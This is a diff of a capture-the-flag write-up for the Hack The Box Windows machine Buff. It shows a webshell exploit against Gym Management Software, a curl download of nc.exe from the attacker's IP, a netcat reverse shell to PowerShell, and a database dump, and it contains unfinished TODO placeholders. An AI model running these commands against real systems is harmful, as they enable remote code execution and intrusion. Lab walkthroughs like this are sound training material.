@@ -1,16 +1,26 @@
+---
+description: >-
+  Zweilosec's writeup on the easy-difficulty Windows machine Buff from
+  https://hackthebox.eu
+---
+
 # HTB - Buff
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/a5e382064576687994dad818cec556b49685a824/windows-machines/easy/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-buff-infocard.png)
 
-Short description to include any strange things to be dealt with - I wish I had taken better notes on this one, since I had done it so long ago I don't remember it so well!...
+Short description to include any strange things to be dealt with 
+
+TODO: finish writeup, clean up. - I wish I had taken better notes on this one, but I finished it during a pretty busy time.
 
 ## Useful Skills and Tools
 
-#### Useful thing 1
+### Edit a text file in PowerShell
 
-* description with generic example
+There is no simple and easy way to edit text files from a command line in PowerShell like in Linux.  However, for simple edits you can use the `.replace()` method for string objects.
+
+* `(Get-Content $input_txt ).Replace('$this','$that') | Out-File $output_txt`
 
 #### Useful thing 2
 
@@ -45,9 +55,27 @@ Nmap done: 1 IP address (1 host up) scanned in 474.18 seconds
 
 Only found two open ports: 7680 which nmap reported \(with low confidence\) as `pando-pub` and 8080, which hosted an Apache HTTP web server.
 
-### http
+### Port 8080 - HTTP
 
-mrbe3n's Bro Hut - on about page Gym Management Software 1.0 - contact page
+![](../../.gitbook/assets/1-buffgym.png)
+
+Some kind of fitness site
+
+![](../../.gitbook/assets/2-about.png)
+
+mrbe3n's Bro Hut - on about page
+
+![](../../.gitbook/assets/3-undefined-index.png)
+
+I found an `upload.php` page, but it gave an error message.
+
+* [https://www.apachefriends.org/index.html](https://www.apachefriends.org/index.html)
+
+> XAMPP is a completely free, easy to install Apache distribution containing MariaDB, PHP, and Perl. The XAMPP open source package has been set up to be incredibly easy to install and to use.
+
+![](../../.gitbook/assets/4-gym-management.png)
+
+ Gym Management Software 1.0 - contact page
 
 [https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/) [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)
 
@@ -80,6 +108,8 @@ mrbe3n's Bro Hut - on about page Gym Management Software 1.0 - contact page
 > #   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
 > ```
 
+The exploit instructions looked more complicated than they actually were.
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/buff]
 └─$ python3 ./buff-exploit.py 'http://10.10.10.198:8080/'                                           1 ⨯
@@ -93,7 +123,11 @@ mrbe3n's Bro Hut - on about page Gym Management Software 1.0 - contact page
 Exiting.
 ```
 
-Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window
+The exploit completed successfully and created a webshell.  Next, I had to connect to it by connecting to the file `kamehameha.php` with my command set as the parameter for the variable `telepathy`.  
+
+{% hint style="info" %}
+You can use **`curl`**, **`burp`**, or your browser to do this.  I think I used the browser this time and just copied the text to my notes.
+{% endhint %}
 
 ```text
 10.10.10.198:8080//upload/kamehameha.php?telepathy=DIR
@@ -102,6 +136,16 @@ PNG  Volume in drive C has no label. Volume Serial Number is A22D-49F7 Director
 . 22/08/2020 17:19
 .. 22/08/2020 17:19 54 kamehameha.php 22/08/2020 16:43 59,392 nc.exe 22/08/2020 16:55 311,296 plink.exe 3 File(s) 370,742 bytes 2 Dir(s) 7,398,789,120 bytes free
 ```
+
+Saw `plink.exe` in the directory and didn't recognize the program, so I looked it up.  
+
+* [https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html)
+
+> Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window
+
+{% hint style="info" %}
+I am pretty sure another player uploaded that there at some point, though at the time I had no idea what it was, or what it was used for.  It is a older and perhaps more common version of **`socat`** that is packaged with Putty.
+{% endhint %}
 
 ```text
 GET /upload/kamehameha.php?telepathy=curl.exe+"http%3a//10.10.15.82%3a8090/nc.exe"+-o+nc.exe HTTP/1.1
@@ -116,7 +160,11 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
+This time I used Burp to send the command to download `nc.exe` to the remote machine from mine using `curl`. 
+
 ## Initial Foothold
+
+
 
 ```text
 http://10.10.10.198:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
@@ -129,6 +177,11 @@ Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 PS C:\xampp\htdocs\gym\upload>
+```
+
+Next I used the `nc.exe` that I had uploaded to send a reverse shell back to my machine.  I received the connection back at my waiting netcat listener and got a PowerShell prompt.
+
+```text
 PS C:\xampp\htdocs\gym\upload> whoami /all
 whoami /all
 
@@ -170,6 +223,18 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 
 ERROR: Unable to get user claims information.
 
+
+```
+
+I found out that I was the user `shaun` on a machine named `BUFF`.  I hadn't seen the group `NT AUTHORITY\BATCH` before, so I looked it up.  
+
+* [https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows)
+
+> A group that includes all users that have logged on through a batch queue facility. Membership is controlled by the operating system.
+
+None of the groups or permissions seemed like anything I could use for privilege escalation.
+
+```text
 PS C:\xampp\htdocs\gym\upload> systeminfo
 systeminfo
 
@@ -218,7 +283,7 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-so now I was user `shaun` on `BUFF`
+The command `systeminfo` told me that this machine was 64-bit and running Windows 10 Enterprise.
 
 ```text
 PS C:\Users\shaun> cd Documents 
@@ -238,13 +303,7 @@ cat Tasks.bat
 START C:/xampp/xampp_start.exe
 ```
 
-Tasks.bat was a very simple script that simply started a service
-
-## Road to User
-
-### Further enumeration
-
-### Finding user creds
+`Tasks.bat` was a very short script that simply started the `xampp` service.
 
 ### User.txt
 
@@ -266,11 +325,15 @@ cat user.txt
 c414e3e8aff37e36d3e0ef36a3c8cdc3
 ```
 
-Got the user flag!
+Got the user flag from `shaun`'s desktop!
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as `shaun`
+### Further enumeration as `shaun` 🐇🐇
+
+{% hint style="info" %}
+Beware...here there be rabbits.  Click [here](buff-write-up.md#cloudme_-1112-exe) if you want to skip the giant rabbit hole I fell down.  It all seemed so real...
+{% endhint %}
 
 ```text
 PS C:\xampp> ls
@@ -373,15 +436,14 @@ cat xampp-control.log
 ...snipped...
 ```
 
-so xampp requires administrative rights, and is version 7.4.6, and control panel 3.2.4
+I found out that `xampp` required administrative rights, and was version 7.4.6. The control panel was version 3.2.4 and compiled on Jun 5th 2019.  I did some research to see if there were any vulnerabilities in this version that I could take advantage of since this seemed pretty old at this point.
 
-[https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)
-
-[https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)
+* [https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)
+* [https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)
 
 > XAMPP \(stands for Cross-Platform \(X\), Apache \(A\), MariaDB \(M\), PHP \(P\) and Perl \(P\)\) is very easy to install Apache Distribution for Linux, Solaris, Windows, and Mac OS X. The package includes the Apache web server, MySQL, PHP, Perl, an FTP server and phpMyAdmin. It is a simple, lightweight Apache distribution that makes it extremely easy for developers to create a local web server for testing and deployment purposes. Everything needed to set up a web server – server application \(Apache\), database \(MariaDB\), and scripting language \(PHP\) – is included in an extractable file. It is also cross-platform, which means it works equally well on Linux, Mac, and Windows. Since most actual web server deployments use the same components as XAMPP, it makes transitioning from a local test server to a live server.
 
-[https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell](https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell)
+* [https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell](https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell)
 
 > `(Get-Content .\input.txt ).Replace('text','fun') | Out-File .\output.txt`
 
@@ -422,7 +484,7 @@ cat passwords.txt
    Please do not forget to refresh the WEBDAV authentification (users and passwords)
 ```
 
-found passwords.txt
+I found a file called `passwords.txt` in the `C:\xampp` folder.  It told me that there was no password set on MySQL which sounded interesting.
 
 ```text
    PS C:\xampp> cat mysql_start.bat
@@ -449,14 +511,16 @@ pause
 :finish
 ```
 
-myslq\_start.bat
+In the same folder was a file called `myslq_start.bat`, which started `mysqld` using the configuration file `mysql\bin\my.ini`.  
+
+[https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
 
 ```text
 PS C:\xampp\mysql\bin> ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt      
 ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt
 ```
 
-[https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
+I used `mysqldump.exe` to dump the contents of the database, but there wasn't anything useful I could find.
 
 ```text
 PS C:\xampp\mysql> ls
@@ -535,6 +599,8 @@ Enjoy!
 ```
 
 Non-rabbit =
+
+### CloudMe\_1112.exe
 
 ```text
 PS C:\Users\shaun\Downloads> ls
@@ -741,7 +807,9 @@ b7f7dbc6de4b535a2e84e8c3362d081b
 
 After getting an Administrator shell it was simple to collect my final proof.
 
-Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for something interesting or useful about this machine.
+![](../../.gitbook/assets/6-buff-pwned.png)
+
+Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
